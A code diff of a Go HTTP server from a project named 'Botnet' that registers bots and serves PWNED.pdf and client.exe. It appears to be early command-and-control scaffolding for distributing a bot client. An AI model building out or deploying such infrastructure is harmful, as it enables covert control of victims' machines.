@@ -9,13 +9,16 @@ import (
 )
 
 // temporary directory location
-//var srcDir = filepath.FromSlash("C:\\Users\\laugh\\go\\src\\github.com\\cjg3484\\Botnet\\src")
-var srcDir = filepath.FromSlash("C:\\Users\\laugh\\GolandProjects\\Botnet\\src")
+var srcDir = filepath.FromSlash("H:\\GolandProjects\\Botnet\\src")
+
+//var srcDir = filepath.FromSlash("C:\\Users\\laugh\\GolandProjects\\Botnet\\src")
 
 type bot struct {
 	Id     string `json:"bot_id"`
 	Status string `json:"status"`
 }
+
+//TODO need storage of bots
 
 func register(rw http.ResponseWriter, req *http.Request) {
 	var b bot
@@ -26,11 +29,19 @@ func register(rw http.ResponseWriter, req *http.Request) {
 		return
 	}
 
-	fmt.Fprintf(rw, "New Bot:\nID: %s\nStatus: %s", b.Id, b.Status)
+	fmt.Printf("New Bot!\nID: %s\nStatus: %s\n", b.Id, b.Status)
+
+	fmt.Fprintf(rw, "New Bot!\nID: %s\nStatus: %s\n", b.Id, b.Status)
+
+	//TODO store bot
 }
 
 func pdfserver(res http.ResponseWriter, req *http.Request) {
 	http.ServeFile(res, req, filepath.Join(srcDir, "/files/PWNED.pdf"))
+}
+
+func clientserver(res http.ResponseWriter, req *http.Request) {
+	http.ServeFile(res, req, filepath.Join(srcDir, "/files/client.exe"))
 }
 
 func main() {
@@ -43,6 +54,9 @@ func main() {
 
 	reg := http.HandlerFunc(register)
 	mux.Handle("/register", reg)
+
+	client := http.HandlerFunc(clientserver)
+	mux.Handle("/client", client)
 
 	log.Println("Listening...")
 	// start HTTP server with `http.DefaultServeMux` handler
